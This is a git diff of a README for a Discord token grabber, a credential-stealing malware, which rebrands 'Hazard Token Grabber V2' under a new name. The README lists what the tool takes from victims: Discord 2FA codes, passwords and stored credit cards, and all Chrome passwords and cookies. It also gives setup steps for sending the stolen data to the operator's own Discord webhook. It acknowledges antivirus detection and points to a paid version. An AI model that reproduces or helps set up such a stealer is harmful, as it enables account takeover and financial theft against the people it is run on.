@@ -1,14 +1,7 @@
-<p align="center">
-  <img src="https://img.shields.io/github/languages/top/Rdimo/Hazard-Token-Grabber-V2?style=flat-square" </a>
-  <img src="https://img.shields.io/github/last-commit/Rdimo/Hazard-Token-Grabber-V2?style=flat-square" </a>
-  <img src="https://img.shields.io/github/stars/Rdimo/Hazard-Token-Grabber-V2?color=%23daff00&label=Stars&style=flat-square" </a>
-  <img src="https://img.shields.io/github/forks/Rdimo/Hazard-Token-Grabber-V2?color=%23daff00&label=Forks&style=flat-square" </a>
-</p>
 
-## ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ 🌟 Star this Repository if you enjoy Hazard Stealer V2!
-**NOTE:** This is a free software. It will not be undetected from antivirus software, or have custom features. Remember, this is 100% free. If you want a better one, join [CheatAway](https://cheataway.com/) and purchase one.
+## ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ 🌟 Star this Repository if you enjoy DYL4N'S TOKEN GRABBER
+**NOTE:** This is a free software. It will not be undetected from antivirus software.
 
----
 
 #### Hazard-Token-Grabber-V2 was made by
 Love ❌ code ✅
@@ -24,10 +17,8 @@ Love ❌ code ✅
 -  Discord 2FA Codes for accounts with 2FA enabled.
 -  Their Passwords & Credit Cards for Discord. (updates when they change it)
 -  All Passwords and Cookies from the Chrome Browser.
-> The webhook notification looks like this:
-<p align="left"><img src="https://user-images.githubusercontent.com/80375661/159514536-d8249923-adbe-4b9e-a187-6b028941f4a7.png"</p>
- 
-### 📁・Setting up Hazard Token Grabber.V2
+
+### 📁・Setting up DYL4N'S TOKEN GRABBER
 1. Install python if you have not already. [(Link Here)](https://www.python.org/)
 2. Replace "WEBHOOK_HERE" with a discord webhook you've created. (Keep the quotes around the webhook)
 3. Double Click `setup.bat` and allow it to finish.
